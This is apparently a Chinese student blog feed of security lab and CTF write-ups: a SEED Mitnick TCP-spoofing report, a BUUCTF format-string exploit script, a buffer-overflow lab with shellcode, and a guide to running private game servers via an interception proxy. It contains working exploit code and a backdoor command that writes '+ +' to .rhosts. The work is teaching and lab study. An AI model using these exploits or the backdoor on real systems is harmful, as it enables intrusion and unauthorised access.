<h4 id="6-建立第二个TCP连接——伪造ACK包"><a href="#6-建立第二个TCP连接——伪造ACK包" class="headerlink" title="6. 建立第二个TCP连接——伪造ACK包"></a>6. 建立第二个TCP连接——伪造ACK包</h4><p>建立第一个连接后，X-Terminal将启动第二次连接，rshd使用此连接来发送错误消息。在本实验中，这个连接不 会被使用。但如果这个连接没有建立，rshd将停止而不执行命令。因此，需要伪造第二个连接来确保命令的执行。  </p>
<p>编写另一个程序，嗅探发送到可信服务器9090端口的TCP流量（假设之前使用9090端口）。当嗅探到一个SYN包时，应该用一个SYN+ACK包来响应。</p>
<p>如果两个连接都已成功建立， 则rshd将执行包含在rsh数据包中的命令。 检查&#x2F;home&#x2F;seed&#x2F;文件夹， 并查看是否创建了&#x2F;home&#x2F;seed&#x2F;， 以及其时间戳是否与当前的时间相匹配 。</p>
<p><code>python</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.伪造SYN响应包</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof</span>(<span class="params">pkt</span>):</span><br><span class="line">    <span class="keyword">if</span> pkt[TCP].flags == <span class="string">&quot;S&quot;</span> <span class="keyword">and</span> pkt[IP].src == <span class="string">&quot;10.9.0.5&quot;</span>:</span><br><span class="line">        old_ip = pkt[IP]</span><br><span class="line">        old_tcp = pkt[TCP]</span><br><span class="line">        tcp_len = old_ip.<span class="built_in">len</span> - old_ip.ihl * <span class="number">4</span> - old_tcp.dataofs * <span class="number">4</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;:&#123;&#125; -&gt; &#123;&#125;:&#123;&#125; Flags=&#123;&#125; Len=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(old_ip.src, old_tcp.sport, old_ip.dst, old_tcp.dport, old_tcp.flags, tcp_len))</span><br><span class="line"></span><br><span class="line">        ip = IP(src=<span class="string">&quot;10.9.0.6&quot;</span>, dst=<span class="string">&quot;10.9.0.5&quot;</span>)</span><br><span class="line">        tcp = TCP(sport=<span class="number">9090</span>, dport=pkt[TCP].sport)</span><br><span class="line">        tcp.flags = <span class="string">&quot;SA&quot;</span></span><br><span class="line">        tcp.seq = pkt[TCP].seq</span><br><span class="line">        tcp.ack = pkt[TCP].seq + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        p = ip / tcp</span><br><span class="line">        send(p, verbose=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">myFilter = <span class="string">&#x27;tcp&#x27;</span>  <span class="comment"># You need to make the filter more specific      </span></span><br><span class="line">sniff(iface=<span class="string">&#x27;br-ac4a3b4d5a3d&#x27;</span>, <span class="built_in">filter</span>=myFilter, prn=spoof)</span><br></pre></td></tr></table></figure>

<p>进行sniff嗅探<code>X-Terminal</code>主机发送第二次TCP连接的SYN包，根据该包构造ip头和tcp头，设置标志位为”SA”表示SYN+ACK包，注意ack序号应为SYN包的<code>seq+1</code>，seq序号可以随意设计。</p>
<p>进行tcpdump查看包交互过程：</p>
<img src="/posts/7fdadce9/sniff.png" class="" title="sniff">

<p><strong>结果检验：</strong></p>
<img src="/posts/7fdadce9/results.png" class="" title="results">



<h4 id="7-设置后门"><a href="#7-设置后门" class="headerlink" title="7. 设置后门"></a>7. 设置后门</h4><p>为了避免每次侵入X-Terminal都需要发动攻击， 可以在X-Terminal上设置一个后门，这个后门允许攻击者无需输入密码就能在任何时候正常地登录到X-Terminal。实现这个后门需要做的就是将字符串“+ +” 添加到X-Terminal的 .rhosts 文件中，将脚本中data数据段命令修改为<code>echo + + &gt; /home/seed/.rhosts</code>即可。</p>
<p><code>python</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = <span class="string">&quot;9090\x00seed\x00seed\x00echo + + &gt; /home/seed/.rhosts\x00&quot;</span></span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p>成功修改了<code>.rhosts</code>文件</p>
<img src="/posts/7fdadce9/result1.png" class="" title="result1">

<p>使用攻击主机进行rsh登录，成功返回日期时间</p>
<img src="/posts/7fdadce9/result2.png" class="" title="result2">

<h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><p>通过本次实验，我了解了当时mitnick进行攻击的具体过程以及实现原理。并且能够简单复现该攻击实验，并且熟练掌握了docker的使用方法。</p>
]]></content>
      <tags>
        <tag>网络攻防</tag>
        <tag>mitnick</tag>
        <tag>实验报告</tag>
        <tag>seed_lab</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF 第五空间PWN5</title>
    <url>/posts/e2482cb8.html</url>
    <content><![CDATA[<h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><ul>
<li>格式化字符串漏洞</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ol>
<li>首先使用<code>checksec</code>工具查看基本信息</li>
</ol>


<p>​		为32位，canary，dep防护</p>
<ol start="2">
<li>使用ida工具进行静态分析。</li>
</ol>
<p><code>main</code></p>


<p>​		main函数主要代码如上图所示，可以看见<code>print((int)v7)</code>存在格式化字符串输出漏洞，因此可以考虑进行利用（<strong>注：由于输入read限制了输入长度，导致无法通过泄漏canary方法来进行栈溢出攻击。</strong>）</p>
<ol start="3">
<li>构造python脚本如下，主要思路为修改printf的got表plt地址为要执行的代码地址（若开启full relro则无法使用），然后再代码执行到下一次调用printf函数时会转去执行目标代码。获得shell。</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment"># p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">29338</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">printf_got = elf.got[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line">info(printf_got)</span><br><span class="line">vuln_1 = <span class="built_in">str</span>(<span class="number">0x0804</span>)</span><br><span class="line">vuln_2 = <span class="built_in">str</span>(<span class="number">0x931A</span>-<span class="number">0x0804</span>)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&#x27;%&#x27;</span>, vuln_1, <span class="string">b&#x27;c&#x27;</span>,<span class="string">b&#x27;%17$hn&#x27;</span>, <span class="string">b&#x27;%&#x27;</span>, vuln_2, <span class="string">b&#x27;c&#x27;</span>, <span class="string">b&#x27;%18$hn&#x27;</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">28</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload = flat(payload, printf_got+<span class="number">2</span>, printf_got)</span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *0x080492BC&#x27;)</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;your name:&#x27;</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Hello,&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>教程</tag>
        <tag>PWN</tag>
        <tag>CTF</tag>
        <tag>格式化字符串漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>某二次元游戏私服搭建总结</title>
    <url>/posts/af718253.html</url>
    <content><![CDATA[<h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>经过大概几个小时的配置环境并debug，终于把Genshin Impact和星穹铁道的私服配置好了。中间也学到了很多东西，以下对整个过程做一个总结。</p>
<h2 id="需要的环境"><a href="#需要的环境" class="headerlink" title="需要的环境"></a><strong>需要的环境</strong></h2><p>Genshin Impact3.4客户端（光是这个就很难找，最后在迅雷上找到了种子），Grasscutter1.4.6最新版，Fiddler最新版，Grasscutter-resources3.4版本，mongod数据库最新版</p>
<h2 id="需要用到的知识"><a href="#需要用到的知识" class="headerlink" title="需要用到的知识"></a><strong>需要用到的知识</strong></h2><p>（非必要，但懂的话做起来更顺利，懂的话就能够进行简单的debug）：<br>1.了解网络代理，证书的相关知识与原理；<br>2.C，JavaScript，shell语言；（能看懂即可）<br>3.了解数据库的运行机制和内部构造；<br>4.了解服务器与客户端与数据库的数据交互过程与方法，网络端口通信；<br>5.会使用命令行，会配置环境变量；<br>6.能科学上网（主要用来上github，不过有时github不用魔法也能打开~）<br>上面所提到的知识主要用于在搭建过程中出现了问题时debug，当然网上也有各种教程，不过网上教程不一定就可以解决你搭建过程出现的问题。所以up强烈建议有上面的知识基础的可以去搞，没有的话搭建起来会很痛苦（来自up本人一年前和一年后的学完上面知识后的亲身体验）。</p>
<h2 id="私服运行主要原理"><a href="#私服运行主要原理" class="headerlink" title="私服运行主要原理"></a><strong>私服运行主要原理</strong></h2><p>原神由于之前工作人员失误导致了私服的产生，目前私服的运行主要由三部分组成，分别是服务器端，客户端和网络代理端，服务器端是Grasscutter大佬自己手搓出来的，客户端是官方的版本包，网络代理用于阻断客户端与官方服务器的连接，并将连接重定向到本地搭建的Grasscutter，也就是私服。</p>
<h2 id="配置环境主要步骤"><a href="#配置环境主要步骤" class="headerlink" title="配置环境主要步骤"></a><strong>配置环境主要步骤</strong></h2><p>1.从github上下载Grasscutter最新版1.4.6版本，还需要gitlab上与之配套的resources和proto，注意版本对应（不对应会导致编译出错等问题，即使成功可能在后面也会有一些问题），resources指Grasscutter搭建所需的资源，proto主要可以修复进入游戏后角色技能不能治疗的bug。<br>2.根据github内Grasscutter的ReadMe文档将服务器搭建好。并且根据其WiKi搭好Fiddler（用于实现网络代理功能）和mongod数据库。<br>3.从网上下载Genshin Impact3.4包，注意版本对应，Grasscutter1.4.6对应原神3.4版本。版本不对应可能会导致创建账号后卡在进入界面，一直白屏。</p>
<h2 id="运行主要步骤"><a href="#运行主要步骤" class="headerlink" title="运行主要步骤"></a><strong>运行主要步骤</strong></h2><p>1.在github上Grasscutter有教程，不仔细展开，在mongod.exe所在目录terminal，运行命令打开数据库，只要terminal界面运行不中断就表明数据库配置成功。<br>2.在Grasscutter文件夹打开命令行，输入命令启动服务器。显示服务器以成功运行，没有报错即表示服务器启动成功，注意要先开数据库，再开服务器，否则服务器端会报错。服务器端开启后在命令行输入命令创建账户，命令在github上都有，不再列出。<br>3.打开Fiddler，添加Grasscutter提供的配置规则，并且修改设置允许https解密，修改默认端口为任意值（只要不是默认8888就可，up也不知道为什么~）。<br>4.打开原神3.4客户端，注意此处为自己下载的客户端内部的yuanshen.exe。进入登录页面Fiddler会有弹窗点击确认即可，这里是指是否信任对方证书，而此时对方是我们自己搭建的服务器，所以直接信任就可。点击确认后，就可以正常登陆自己在服务器创建的用户了。</p>
<h2 id="崩坏：星穹铁道私服"><a href="#崩坏：星穹铁道私服" class="headerlink" title="崩坏：星穹铁道私服"></a><strong>崩坏：星穹铁道私服</strong></h2><p>总体思路与原神差不多，并且要比原神简单很多（因为客户端是测试服的包，所以加密防护做的并没有原神好，不需要打补丁），具体过程只需把客户端改为星穹铁道测试服版本，然后运行数据库，运行服务器（这里你需要去网上找资源，Grasscutter服务器是java搭建的，而星穹铁道是用node搭建的，up因为用过node，所以很快就配置完成了），但由于网上基本没有资源，并且教程也极少，而且其也即将开服等等原因，就不再赘述了。</p>
<h2 id="搭建过程中遇到的问题"><a href="#搭建过程中遇到的问题" class="headerlink" title="搭建过程中遇到的问题"></a><strong>搭建过程中遇到的问题</strong></h2><p><strong>星穹铁道：</strong><br>  1.运行服务器端报错显示版本不对；<br>  解决办法：将显示版本不对的包更新。<br>  2.打开客户端后显示全局分发错误。<br>  解决办法：是代理出现问题，更改其规则并且修改设置中开放端口。<br>  3.同2的另一种原因。似乎是使用了校园网，更改后问题解决。</p>
<p><strong>原神：</strong><br>  1.进入后显示4214报错；<br>  原因：原神在2.8版本后就开始增加了客户端对服务器的检测，目的就是打击私服<br>  解决办法：Grasscutter大佬已经打了补丁，不过不同版本补丁也不尽相同，并且目前最新版本3.5版本也暂时没有，3.4版本似乎是使用了公私钥加密来做了密钥协商，不过Grasscutter大佬还是把补丁搓出来了（膜~~~）根据github上教程安装补丁即可<br>  2.打补丁后发现可以登录但进不去，卡在进入界面，一直白屏；<br>  原因：大概率是因为版本不对应，网上有说是因为udp连接端口没打开，代理有问题的基本全是错的（如果你是服务器在自己本地的话）。<br>  解决方法：检查一遍各个资源版本是否对应。<br>  3.更换资源后编译服务器报错；<br>  原因：之前已经编译过的话，服务器内部就已经存储了数据和配置，需要把这些都删掉再编译；<br>  解决办法：删去data，cache文件夹，还是不行就重新下载Grasscutter，重新编译。</p>
<p>另外还需要检查是否关闭了vpn，debug时建议查看数据库，服务器端和fiddler的输出信息来判断。</p>
<h2 id="总结感想"><a href="#总结感想" class="headerlink" title="总结感想"></a><strong>总结感想</strong></h2><p>整个私服配置下来还是很繁琐的，并且搭建过程中需要大量的时间debug，up在搭建过程中就遇到了各种各样的问题，并且网上教程解决方案较少，并且大多数都是不对的，如果了解上面所提到的那些知识的话，debug的时间就会大幅缩小，并且你也会在搭建过程中作很好的实践，并学到很多新东西。up也是在多次查询博客教程无果后选择自己去解决，然后发现大学学的课程还真有用~~~。<br>本篇文章主要用作up本人学习总结用，也希望能给正在搭建私服的人思路，并且up在此也建议没有计算机基础的同学尽量不要碰，否则会变得不幸。</p>
]]></content>
      <tags>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>【SEED Lab2.0】缓冲区溢出实验报告</title>
    <url>/posts/637eab0b.html</url>
    <content><![CDATA[<h2 id="stack-overflow-setuid"><a href="#stack-overflow-setuid" class="headerlink" title="stack_overflow(setuid)"></a>stack_overflow(setuid)</h2><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>配置环境，关闭ASLR地址随机化，将&#x2F;bin&#x2F;sh链接到&#x2F;bin&#x2F;zsh（&#x2F;bin&#x2F;dash以及&#x2F;bin&#x2F;bash都实现了一种安全对策， 防止自己在Set-UID进程中执行。 基本上，如果它们检测到它们是在一个Set-UID进程中执行的， 它们会立即将有效的用户ID更改为该进程的真实用户ID， 基本上会放弃特权  ）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ sudo sysctl -w kernel.randomize_va_space=0 </span><br><span class="line">kernel.randomize_va_space = 0</span><br><span class="line">❯ sudo ln -sf /bin/zsh /bin/sh</span><br></pre></td></tr></table></figure>

<h3 id="Task1：-熟悉shellcode"><a href="#Task1：-熟悉shellcode" class="headerlink" title="Task1： 熟悉shellcode"></a>Task1： 熟悉shellcode</h3><p><code>shellcode C代码实现</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *name[<span class="number">2</span>];</span><br><span class="line">    name[<span class="number">0</span>] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">    name[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line">    execve(name[<span class="number">0</span>], name, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>shellcode 二进制代码实现</code>:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* call_shellcode.c */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Binary code for setuid(0) </span></span><br><span class="line"><span class="comment">// 64-bit:  &quot;\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05&quot;</span></span><br><span class="line"><span class="comment">// 32-bit:  &quot;\x31\xdb\x31\xc0\xb0\xd5\xcd\x80&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> shellcode[] =</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __x86_64__</span></span><br><span class="line">  <span class="string">&quot;\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e&quot;</span></span><br><span class="line">  <span class="string">&quot;\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57&quot;</span></span><br><span class="line">  <span class="string">&quot;\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f&quot;</span></span><br><span class="line">  <span class="string">&quot;\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31&quot;</span></span><br><span class="line">  <span class="string">&quot;\xd2\x31\xc0\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">char</span> code[<span class="number">500</span>];</span><br><span class="line"></span><br><span class="line">   <span class="built_in">strcpy</span>(code, shellcode);</span><br><span class="line">   <span class="type">int</span> (*func)() = (<span class="type">int</span>(*)())code;</span><br><span class="line"></span><br><span class="line">   func();</span><br><span class="line">   <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将<code>call_shellcode.c</code>编译运行，可以发现会得到shell：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ make</span><br><span class="line">gcc -m32 -z execstack -o a32.out call_shellcode.c</span><br><span class="line">gcc -z execstack -o a64.out call_shellcode.c</span><br><span class="line">❯ ./a32.out</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span></span>                                                                           </span><br><span class="line">Makefile  a32.out  a64.out  call_shellcode.c</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">exit</span></span>                                                                         </span><br><span class="line">❯ ./a64.out</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span></span>                                                                           </span><br><span class="line">Makefile  a32.out  a64.out  call_shellcode.c</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">exit</span></span>                   </span><br></pre></td></tr></table></figure>

<h3 id="Task2：查看漏洞程序"><a href="#Task2：查看漏洞程序" class="headerlink" title="Task2：查看漏洞程序"></a>Task2：查看漏洞程序</h3><p><code>stack.c</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="comment">/* Changing this size will change the layout of the stack.</span></span><br><span class="line"><span class="comment">* Instructors can change this value each year, so students</span></span><br><span class="line"><span class="comment">* won’t be able to use the solutions from the past. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> BUF_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUF_SIZE 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">bof</span><span class="params">(<span class="type">char</span> *str)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> buffer[BUF_SIZE];</span><br><span class="line"><span class="comment">/* The following statement has a buffer overflow problem */</span></span><br><span class="line"><span class="built_in">strcpy</span>(buffer, str);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> str[<span class="number">517</span>];</span><br><span class="line">FILE *badfile;</span><br><span class="line">badfile = fopen(<span class="string">&quot;badfile&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">fread(str, <span class="keyword">sizeof</span>(<span class="type">char</span>), <span class="number">517</span>, badfile);</span><br><span class="line">bof(str);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Returned Properly\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以发现该程序从badfile文件中读取517字节输入，然而BUF_SIZE的长度只有100，因此如果文件内容大于100会导致栈溢出。</p>
<p><strong>编译程序</strong>：将stack.c文件根据不同要求编译为四种不同保护强度的二进制可执行文件，并且修改其文件所有者为root，执行权限为setuid。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ sudo sysctl -w kernel.randomize_va_space=0 </span><br><span class="line">kernel.randomize_va_space = 0</span><br><span class="line">❯ sudo ln -sf /bin/zsh /bin/sh                                                           </span><br><span class="line">❯ make</span><br><span class="line">gcc -DBUF_SIZE=100 -z execstack -fno-stack-protector -m32 -o stack-L1 stack.c</span><br><span class="line">gcc -DBUF_SIZE=100 -z execstack -fno-stack-protector -m32 -g -o stack-L1-dbg stack.c</span><br><span class="line">sudo chown root stack-L1 &amp;&amp; sudo chmod 4755 stack-L1</span><br><span class="line">[sudo] bronya 的密码： </span><br><span class="line">gcc -DBUF_SIZE=160 -z execstack -fno-stack-protector -m32 -o stack-L2 stack.c</span><br><span class="line">gcc -DBUF_SIZE=160 -z execstack -fno-stack-protector -m32 -g -o stack-L2-dbg stack.c</span><br><span class="line">sudo chown root stack-L2 &amp;&amp; sudo chmod 4755 stack-L2</span><br><span class="line">gcc -DBUF_SIZE=200 -z execstack -fno-stack-protector -o stack-L3 stack.c</span><br><span class="line">gcc -DBUF_SIZE=200 -z execstack -fno-stack-protector -g -o stack-L3-dbg stack.c</span><br><span class="line">sudo chown root stack-L3 &amp;&amp; sudo chmod 4755 stack-L3</span><br><span class="line">gcc -DBUF_SIZE=10 -z execstack -fno-stack-protector -o stack-L4 stack.c</span><br><span class="line">gcc -DBUF_SIZE=10 -z execstack -fno-stack-protector -g -o stack-L4-dbg stack.c</span><br><span class="line">sudo chown root stack-L4 &amp;&amp; sudo chmod 4755 stack-L4</span><br></pre></td></tr></table></figure>

<h3 id="Task3：攻击32位程序"><a href="#Task3：攻击32位程序" class="headerlink" title="Task3：攻击32位程序"></a>Task3：攻击32位程序</h3><p><strong>gdb调试</strong>：新建badfile文件，使用gdb调试工具进行动态分析。在调试过程中在<code>bof</code>函数处设置断点，使程序运行到此，查看此时寄存器<code>ebp</code>和<code>buffer</code>的地址，由于需要溢出的输入需要从buffer开始一直覆盖到ebp寄存器，因此需要计算两地址的差值（0x6c）。因此可以通过此来构造payload进行栈溢出攻击，使ebp指向地址覆盖为shellcode。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ touch badfile</span><br><span class="line">❯ gdb ./stack-L1-dbg</span><br><span class="line">Breakpoint 1, bof (str=0xffffccc3 &quot;&quot;) at stack.c:20</span><br><span class="line">20	    strcpy(buffer, str);       </span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────</span><br><span class="line">*EAX  0x56558fb8 (_GLOBAL_OFFSET_TABLE_) ◂— 0x3ec0</span><br><span class="line">*EBX  0x56558fb8 (_GLOBAL_OFFSET_TABLE_) ◂— 0x3ec0</span><br><span class="line">*ECX  0x60</span><br><span class="line">*EDX  0xffffcca0 —▸ 0xffffcfa4 —▸ 0xffffd18d ◂— &#x27;/home/bronya/Documents/SJTU/lab/buffer-overflow/setuid/Labsetup/code/stack-L1-dbg&#x27;</span><br><span class="line">*EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0x0</span><br><span class="line">*ESI  0xffffcfa4 —▸ 0xffffd18d ◂— &#x27;/home/bronya/Documents/SJTU/lab/buffer-overflow/setuid/Labsetup/code/stack-L1-dbg&#x27;</span><br><span class="line">*EBP  0xffffc898 —▸ 0xffffcca8 —▸ 0xffffced8 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— ...</span><br><span class="line">*ESP  0xffffc820 —▸ 0xf7ffd608 (_rtld_global+1512) —▸ 0xf7fc6000 ◂— 0x464c457f</span><br><span class="line">*EIP  0x5655621e (bof+17) ◂— 0xff08ec83</span><br><span class="line">───────────────────────[ DISASM / i386 / set emulate on ]───────────────────────</span><br><span class="line"> ► 0x5655621e &lt;bof+17&gt;    sub    esp, 8</span><br><span class="line">   0x56556221 &lt;bof+20&gt;    push   dword ptr [ebp + 8]</span><br><span class="line">   0x56556224 &lt;bof+23&gt;    lea    edx, [ebp - 0x6c]</span><br><span class="line">   0x56556227 &lt;bof+26&gt;    push   edx</span><br><span class="line">   0x56556228 &lt;bof+27&gt;    mov    ebx, eax</span><br><span class="line">   0x5655622a &lt;bof+29&gt;    call   strcpy@plt                    &lt;strcpy@plt&gt;</span><br><span class="line"> </span><br><span class="line">   0x5655622f &lt;bof+34&gt;    add    esp, 0x10</span><br><span class="line">   0x56556232 &lt;bof+37&gt;    mov    eax, 1</span><br><span class="line">   0x56556237 &lt;bof+42&gt;    mov    ebx, dword ptr [ebp - 4]</span><br><span class="line">   0x5655623a &lt;bof+45&gt;    leave  </span><br><span class="line">   0x5655623b &lt;bof+46&gt;    ret    </span><br><span class="line">───────────────────────────────[ SOURCE (CODE) ]────────────────────────────────</span><br><span class="line">In file: /home/bronya/Documents/SJTU/lab/buffer-overflow/setuid/Labsetup/code/stack.c</span><br><span class="line">   15 int bof(char *str)</span><br><span class="line">   16 &#123;</span><br><span class="line">   17     char buffer[BUF_SIZE];</span><br><span class="line">   18 </span><br><span class="line">   19     // The following statement has a buffer overflow problem </span><br><span class="line"> ► 20     strcpy(buffer, str);       </span><br><span class="line">   21 </span><br><span class="line">   22     return 1;</span><br><span class="line">   23 &#125;</span><br><span class="line">   24 </span><br><span class="line">   25 int main(int argc, char **argv)</span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ esp 0xffffc820 —▸ 0xf7ffd608 (_rtld_global+1512) —▸ 0xf7fc6000 ◂— 0x464c457f</span><br><span class="line">01:0004│     0xffffc824 —▸ 0x56557031 ◂— 0x3d3d3d00</span><br><span class="line">02:0008│     0xffffc828 —▸ 0xffffccb4 ◂— 0x0</span><br><span class="line">03:000c│     0xffffc82c ◂— 0x0</span><br><span class="line">... ↓        4 skipped</span><br><span class="line">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► 0 0x5655621e bof+17</span><br><span class="line">   1 0x56556342 dummy_function+58</span><br><span class="line">   2 0x565562da main+158</span><br><span class="line">   3 0xf7c21519 __libc_start_call_main+121</span><br><span class="line">   4 0xf7c215f3 __libc_start_main+147</span><br><span class="line">   5 0x5655610b _start+43</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p <span class="variable">$ebp</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1 = (void *) 0xffffc898</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p &amp;buffer</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">2 = (char (*)[100]) 0xffffc82c</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x 0xffffc898 - 0xffffc82c</span></span><br><span class="line">0x6c:	Cannot access memory at address 0x6c</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">q</span></span><br></pre></td></tr></table></figure>

<p><strong>构造python脚本</strong>：根据动态调试结果构造python脚本如下，python脚本对content（即payload）变量进行三次赋值，第一次赋值为长度为517字节全<code>\x90</code>，第二次将content末尾修改为shellcode，最后将rbp寄存器指向地址修改为程序原本返回的地址（防止程序在执行shellcode前因无法执行返回操作而崩溃）。注意gdb调试获取到的栈指针地址与实际运行会略有不同，因为gdb会将一些环境数据压入栈中，导致实际的栈指针变量会偏大，因此在构造payload时，ret的值并不是ebp，而是应该增大一些（&gt;&#x3D;96）。</p>
